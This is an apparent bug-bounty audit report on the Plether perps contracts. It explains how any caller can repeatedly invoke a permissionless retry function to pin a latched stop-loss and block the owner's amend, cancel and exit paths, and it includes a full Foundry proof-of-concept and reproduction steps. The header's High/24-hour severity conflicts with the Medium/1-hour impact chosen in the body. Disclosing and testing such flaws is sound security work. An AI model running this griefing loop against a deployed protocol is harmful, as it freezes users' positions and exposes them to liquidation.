# \#97673 [SC-High] Permissionless protection retry can pin a latched stop-loss and block owner recovery and full-position exit

**Submitted on Nov 2nd 2026 at 16:06:22 UTC by @ratavuli for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97673
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

A latched position protection can be kept in the `Triggered` state by any caller repeatedly invoking the permissionless `retryPositionProtectionClose` function. While that retry is live, the position owner can no longer amend the protection's retained close limits, cancel the protection, or submit an ordinary or manual full close. A stop-loss exit can therefore be delayed for at least one hour with repeated low-cost retries, leaving the position open and exposed to liquidation. The issue is in the in-scope perps contracts under `packages/perps/src`, primarily `PositionProtectionBook` and the Router's protection-close path.

## Vulnerability Details

The target asset is the fourth in-scope asset:

```text
All other contracts, libraries, router contracts and interfaces in packages/perps/src
https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
```

### Protection state machine

A protection becomes `Latched` after a triggered protected close fails or expires while the exact protected position remains open. The owner is then meant to have two recovery paths:

- amend the retained financial ceilings with `amendLatchedPositionProtectionCloseLimits`, or
- retry the close with `retryPositionProtectionClose`.

The amendment path is owner-only, requires `Latched`, and requires no pending account order:

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The retry path is permissionless:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

`_recordCloseAttempt` sets the status to `Triggered` and binds the new child order:

```solidity
protection.linkedOrderId = linkedOrderId;
protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
```

The retry request copies the protection's stored limits unchanged:

```solidity
PositionProtectionTypes.CloseFinancialLimits memory limits =
    host.positionProtectionBook().closeFinancialLimits(protectionId);
...
request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

### The lock

While the retry is `Triggered`, every owner recovery path is rejected:

- `amendLatchedPositionProtectionCloseLimits` reverts `OrderRouter__ProtectionNotLatched` because the status is no longer `Latched`.
- `cancelPositionProtection` calls `_cancel`, which accepts only `PendingOpen` or `Armed`; it reverts `OrderRouter__ProtectionNotArmed`.
- `cancelPositionProtectionAndCommitClose` accepts only `Armed`; it also reverts `OrderRouter__ProtectionNotArmed`.
- An ordinary `commitOrder` close is rejected while an active protection exists (`OrderRouter__ProtectionActive`), and the account also has the attacker's pending child.

There is no function that lets the owner cancel the pending protected close. Consequently, the attacker can keep the account pinned by ensuring a retry is live whenever the previous one expires:

1. The attacker waits until the retry's execution deadline.
2. The attacker or anyone expires the retry; the protection relatches.
3. The attacker immediately calls `retryPositionProtectionClose` again before the owner can amend.
4. The new retry again occupies `Triggered` with the same stale ceilings.

The attacker does not need to be the owner, a registered participant, or a keeper with special permissions; `retryPositionProtectionClose` is intentionally permissionless because keepers are untrusted. The only direct cost is gas.

### Reachable precondition

The attack requires a protection whose retained close ceilings make the generated close fail after a market move. This is not only an intentionally impossible configuration. The PoC uses a normal 5% buffer over the current notional:

- Position: 10,000 notional at mark 1.00.
- User close limit: 10,500 (5% above the current close notional).
- Stop-loss: 1.10.
- Market mark moves to 1.20.
- The generated full close has 12,000 notional, exceeding the 10,500 ceiling.

The keeper executes the first protected close at the valid 1.20 mark. The close fails with `ConstraintViolation` and the protection becomes `Latched`. The attacker then starts the retry loop. The same stale 10,500 ceiling is copied into every retry, so each execution fails and relatches.

This is not the previously known MED-9 issue. MED-9 concerned permissionless retries having no trader-selected financial ceilings. The fix at `a82d4fef` retained those ceilings and added owner-only amendment. This report concerns a new race introduced by that fix: the permissionless retry can occupy the only state in which the owner is allowed to amend, so the owner cannot use the amendment path under normal public transaction ordering. A report on a fixed/acknowledged root cause is valid only if the fix at `a82d4fef` is incomplete or introduces a new bug; this is the latter.

## Impact Details

Selected program impact: **Temporary freezing of funds for at least 1 hour** (Medium). Secondary impact: **Griefing** (Medium).

The owner cannot close, cancel, or amend the position for as long as the attacker keeps a retry live. The PoC demonstrates 60 consecutive retry/expiry cycles, covering at least one hour of wall-clock time, while:

- the position remains fully open;
- the attacker's stale-limit retry remains the live child;
- owner amendment, cancellation, and manual exit all revert; and
- no other ordinary close can be submitted.

The affected value is the position's collateral and unrealized exposure. No principal is transferred to the attacker, so this is not direct theft, but the victim's exit is blocked while the market can move against the position. If the position becomes unsafe, it can be liquidated while the stop-loss exit is pinned, causing liquidation penalties and loss of the position's remaining value. The attacker gains nothing directly, which matches the Griefing category; the victim's loss can still be materially larger than the attacker's gas cost.

The 24-hour High impact is plausible if the attacker sustains the loop, but the supplied PoC only proves the 1-hour impact. I am therefore selecting Medium, not High.

## References

- Scope asset: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- `PositionProtectionBook.sol`: `retryPositionProtectionClose` lines 381-406, `_cancel` lines 408-429, `amendLatchedPositionProtectionCloseLimits` lines 314-328, `_recordCloseAttempt` lines 570-578.
- `OrderLiquidationBatchLogic.sol`: `_protectionCloseRequest` lines 657-680 and active-protection admission check lines 313-315.
- Relevant program text: permissionless keepers are untrusted and in scope; Griefing and temporary freezing are in-scope impacts; MED-9 is a known issue and this report is a new race in its fix.


## Proof of Concept

## Repository prerequisites

- Foundry/Forge.
- A checkout of the in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- The existing test helper `PositionProtectionTest` (and its `BasePerpTest` base) from the repository's test suite. The helper supplies the real Router, Engine, clearinghouse, pool, and mock Pyth/USDG setup.
- No contract in `packages/perps/src` is modified.

## Complete Foundry test

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";

contract F007RetryPinPoC is PositionProtectionTest {

    function test_F007_attackerPinsLatchedProtectionForOneHour() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, 15_000e6, MARK_PRICE);

        // A normal 5%-buffer notional ceiling, not an intentionally impossible value.
        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, 110_000_000);
        params.closeLimits.maxExecutionNotionalAssets = 10_500e6;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);

        // The stop-loss fires at 120,000. The generated close exceeds the stored 10,500 notional ceiling.
        uint64 firstOrderId = _triggerAt(protectionId, 120_000_000);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory firstAttempt =
            router.executeOrder(firstOrderId, _mockPythUpdateData(120_000_000));
        assertEq(uint8(firstAttempt.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
        );

        // An unrelated caller immediately retries; the retry inherits the stale ceiling and enters Triggered.
        vm.prank(CAROL);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);

        PositionProtectionTypes.CloseFinancialLimits memory amended = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });

        uint64 start = uint64(block.timestamp);
        for (uint256 i; i < 60; ++i) {
            // The attacker lets the stale retry expire; it relatches.
            _expireProtectionAttempt(retryId, EXECUTION_KEEPER);
            assertEq(
                uint8(protectionViews.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Latched)
            );
            // ... and immediately retries again, denying the owner the amendment window.
            vm.prank(CAROL);
            retryId = protectionActions.retryPositionProtectionClose(protectionId);
        }
        assertGe(block.timestamp - start, 1 hours, "position remained pinned for at least one hour");

        // The owner still cannot amend, cancel, or manually exit while the attacker's retry is live.
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amended);

        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        vm.prank(ALICE);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory closeRequest = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        vm.prank(ALICE);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, closeRequest);

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "position is still open after one hour");
        assertEq(router.pendingOrderCounts(ALICE), 1, "attacker's stale-limit retry is still live");
        assertEq(router.lifecycleBook().pendingPolicy(retryId).maxExecutionNotionalAssets, 10_500e6);
    }
}
```

The identifiers `ALICE`, `CAROL`, `EXECUTION_KEEPER`, `POSITION_SIZE`, `MARK_PRICE`, `_open`, `_params`, `_triggerAt`, `_expireProtectionAttempt`, `_manualCloseRequest`, `protectionActions`, `protectionViews`, `router`, and `engine` are supplied by the existing repository test helper. The test does not change the helper or any in-scope contract.

## Run command

Use the default via-IR build if the machine has enough memory. The local validation used the memory-constrained equivalent:

```bash
FOUNDRY_VIA_IR=false FOUNDRY_OPTIMIZER=true \
  forge test --match-contract F007RetryPinPoC --match-test test_F007 -vv
```

Expected result:

```text
[PASS] test_F007_attackerPinsLatchedProtectionForOneHour()
1 test passed
```

## Step-by-step reproduction

### 1. Set up a normal long position and a normal stop-loss

Open a LONG position with `POSITION_SIZE = 10,000e18` and `15,000e6` margin at mark `1.00`.

Create protection with:

```text
takeProfitTriggerPrice = 0       // disabled
stopLossTriggerPrice   = 110,000,000 (1.10)
maxExecutionNotionalAssets = 10,500e6
other close limits = type(uint256).max
```

The 10,500 ceiling is a 5% buffer over the current 10,000 close notional; it is not an intentionally impossible value.

### 2. Trigger the stop-loss at 1.20 and execute the first close

Call `triggerPositionProtection` with a valid 1.20 mark. The generated protected close has:

```text
size     = 10,000e18
mark     = 120,000,000
notional = 12,000e6
```

`12,000e6 > 10,500e6`, so executing the protected close fails with `ConstraintViolation`. The position remains open and `handleFailedProtectionAttempt` sets the protection to `Latched`.

The test asserts:

```text
firstAttempt.status == Failed
protection.status   == Latched
```

### 3. Attacker starts the retry

An unrelated account (`CAROL`) calls:

```solidity
protectionActions.retryPositionProtectionClose(protectionId);
```

`retryPositionProtectionClose` is permissionless. It creates a fresh protected close with the same stored 10,500e6 ceiling and calls `_recordCloseAttempt`, which sets:

```text
protection.status = Triggered
```

### 4. Owner recovery is blocked

While the retry is live, the test calls each owner path and observes:

```text
amendLatchedPositionProtectionCloseLimits -> OrderRouter__ProtectionNotLatched
cancelPositionProtection                  -> OrderRouter__ProtectionNotArmed
cancelPositionProtectionAndCommitClose    -> OrderRouter__ProtectionNotArmed
ordinary Router commitOrder               -> rejected while protection is active/pending
```

The owner cannot amend the ceilings, cannot cancel, and cannot submit a manual exit.

### 5. Attacker repeats for one hour

The test loops 60 times:

1. Wait until the current retry's execution deadline.
2. Expire the retry; it relatches because the exact position is still present.
3. Immediately call `retryPositionProtectionClose` from `CAROL` with the same stale limits.
4. Observe the position is still open and the new retry is `Triggered`.

At the end:

```text
block.timestamp - start >= 1 hours
remaining position size == POSITION_SIZE
pendingOrderCounts(ALICE) == 1
pendingPolicy(retryId).maxExecutionNotionalAssets == 10,500e6
```

Each retry/expiry is a separate transaction in production, so the loop models 60 transactions over one hour, not a single oversized transaction.

### 6. What the PoC proves

- The trigger and retry paths are permissionless and in scope.
- A latched protection can be kept in `Triggered` by an unrelated caller.
- The owner's amendment, cancellation, and manual-exit paths are unavailable during the attacker's retry.
- The attack is repeatable with the same stale limit, producing at least a one-hour denial of the full-position exit.
- No direct theft occurs; the impact is Griefing and temporary freezing of the open position's collateral, with liquidation risk if the market moves adversely.

## Why the PoC is valid under the program rules

- It runs in the repository's Foundry suite at the in-scope commit and does not modify in-scope contracts.
- Mocks only replace components outside scope: Pyth price updates and the test settlement token.
- It does not test production or a public testnet.
- The 1-hour impact matches the impact selected in the report: **Temporary freezing of funds for at least 1 hour** (Medium); **Griefing** is the secondary classification.

